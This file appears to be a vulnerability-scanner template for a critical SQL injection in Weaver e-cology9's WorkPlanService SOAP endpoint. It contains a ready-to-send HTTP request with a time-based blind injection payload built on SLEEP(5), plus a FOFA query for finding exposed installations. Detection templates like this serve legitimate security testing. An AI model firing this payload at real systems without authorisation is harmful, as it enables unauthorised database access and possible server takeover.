templates/ecology-v9-workplanservice-sqli.yaml

http:
- matchers:
  - dsl:
    - duration>=5
    type: dsl
  raw:
  - "@timeout: 10s\nPOST /services/WorkPlanService HTTP/1.1\nHost: {{Hostname}}\n\
    Content-Type: text/xml;charset=UTF-8\n\n<soapenv:Envelope xmlns:soapenv=\"http://schemas.xmlsoap.org/soap/envelope/\"\
    \ xmlns:web=\"webservices.workplan.weaver.com.cn\">\n    <soapenv:Header />\n\
    \    <soapenv:Body>\n        <web:deleteWorkPlan>\n            <!--type: string-->\n\
    \            <web:in0>\n                (SELECT 8544 FROM (SELECT (SLEEP(5-(IF(27=27,0,5)))))NZeo)\n\
    \            </web:in0>\n            <!--type: int-->\n            <web:in1>\n\
    \                22\n            </web:in1>\n        </web:deleteWorkPlan>\n \
    \   </soapenv:Body>\n</soapenv:Envelope>\n"
id: ecology-v9-workplanservice-sqli
info:
  author: Co5mos
  description: "\u6CDB\u5FAE e-cology9 WorkPlanService \u524D\u53F0\u5B58\u5728 SQL\
    \ \u6CE8\u5165\u6F0F\u6D1E\uFF0C\u653B\u51FB\u8005\u80FD\u591F\u5229\u7528\u8BE5\
    \u6F0F\u6D1E\u6267\u884C\u4EFB\u610F SQL \u8BED\u53E5\uFF0C\u83B7\u53D6\u6570\u636E\
    \u5E93\u654F\u611F\u4FE1\u606F\u6216\u63A7\u5236\u6570\u636E\u5E93\u670D\u52A1\
    \u5668\u3002\n"
  metadata:
    fofa-query: "app=\"\u6CDB\u5FAE-OA\uFF08e-cology\uFF09\""
  name: Weaver e-cology9 WorkPlanService SQL Injection
  severity: critical
  tags: weaver, sqli, rce
